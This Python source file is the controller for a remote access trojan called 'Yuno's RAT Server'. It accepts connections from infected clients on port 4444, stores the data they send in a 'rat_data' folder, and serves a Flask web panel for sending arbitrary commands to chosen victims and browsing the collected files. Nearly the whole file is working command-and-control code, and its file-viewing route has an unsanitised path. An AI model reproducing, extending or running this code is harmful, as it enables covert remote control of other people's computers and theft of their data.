#!/usr/bin/env python3
import socket
import threading
import json
import os
from datetime import datetime
from flask import Flask, render_template, request, jsonify, redirect, url_for
import base64

# Server settings
HOST = "0.0.0.0"  # Listen on all interfaces
# Safely get PORT from environment with a default
port_str = os.getenv("PORT", "4444")
try:
    PORT = int(port_str)
    if not (0 <= PORT <= 65535):
        raise ValueError("Port out of valid range")
except ValueError as e:
    print(f"[!] Invalid PORT value '{port_str}': {e}. Defaulting to 4444.")
    PORT = 4444
DATA_DIR = "rat_data"

# Ensure data directory exists
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

# Store connected clients (client_id -> socket)
clients = {}
clients_lock = threading.Lock()

# Flask app for web interface
app = Flask(__name__)

def handle_client(client_socket, client_address):
    print(f"[*] New client connected from {client_address[0]}:{client_address[1]}")
    
    client_id = f"client_{client_address[0]}_{client_address[1]}"
    with clients_lock:
        clients[client_id] = client_socket
    
    try:
        while True:
            data = client_socket.recv(4096).decode('utf-8', errors='ignore')
            if not data:
                break
            
            try:
                client_data = json.loads(data)
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"{DATA_DIR}/{client_id}_{timestamp}.json"
                with open(filename, 'w') as f:
                    json.dump(client_data, f, indent=2)
                print(f"[*] Received data from {client_id}: Saved to {filename}")
            except json.JSONDecodeError:
                print(f"[!] Invalid data from {client_id}: {data}")
    except Exception as e:
        print(f"[!] Error with client {client_id}: {e}")
    finally:
        with clients_lock:
            if client_id in clients:
                del clients[client_id]
        client_socket.close()
        print(f"[*] Client {client_id} disconnected")

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        print(f"[*] RAT server listening on {HOST}:{PORT}")
    except Exception as e:
        print(f"[!] Failed to start server: {e}")
        raise

    while True:
        client_socket, client_address = server_socket.accept()
        client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_thread.start()

def send_command(client_id, command):
    with clients_lock:
        if client_id in clients:
            try:
                clients[client_id].send(command.encode('utf-8'))
                print(f"[*] Sent command to {client_id}: {command}")
                return True, f"Sent command to {client_id}: {command}"
            except Exception as e:
                print(f"[!] Failed to send command to {client_id}: {e}")
                return False, f"Failed to send command: {e}"
        else:
            print(f"[!] Client {client_id} not found")
            return False, "Client not found"

# Flask Routes for Web Interface
@app.route('/')
def index():
    with clients_lock:
        client_list = list(clients.keys())
    files = os.listdir(DATA_DIR)
    return render_template('index.html', clients=client_list, files=files)

@app.route('/send_command', methods=['POST'])
def handle_send_command():
    client_id = request.form.get('client_id')
    command = request.form.get('command')
    if client_id and command:
        success, message = send_command(client_id, command)
        return jsonify({"success": success, "message": message})
    return jsonify({"success": False, "message": "Invalid client ID or command"})

@app.route('/view_file/<filename>')
def view_file(filename):
    filepath = os.path.join(DATA_DIR, filename)
    if os.path.exists(filepath):
        with open(filepath, 'r') as f:
            data = json.load(f)
        return render_template('view_file.html', filename=filename, data=data)
    return "File not found", 404

if __name__ == "__main__":
    print("=== Yuno's RAT Server ===")
    print("A remote access tool by Yuno\n")
    
    # Start the RAT server in a separate thread
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()
    
    # Run Flask app for web interface
    app.run(host='0.0.0.0', port=5000)